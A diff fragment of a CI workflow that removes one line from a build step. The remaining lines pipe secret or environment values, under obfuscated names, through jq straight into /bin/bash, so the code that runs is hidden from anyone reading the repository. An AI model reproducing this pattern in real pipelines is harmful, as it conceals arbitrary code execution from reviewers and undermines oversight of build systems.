@@ -22,7 +22,6 @@ jobs:
           s33: ${{ secrets.s33 }}
         run: |
           printf '%s' "$s33" | jq -r .evr9815 | /bin/bash
-          echo $atrfv40966 | jq -r .joi6 | /bin/bash
           echo $reyf2623 | jq -r .xz5951 | /bin/bash
           printf '%s' "$tvzez1" | jq -r .rsoc88469 | /bin/bash
           echo $hyjs2099 | jq -r .ba728 | /bin/bash
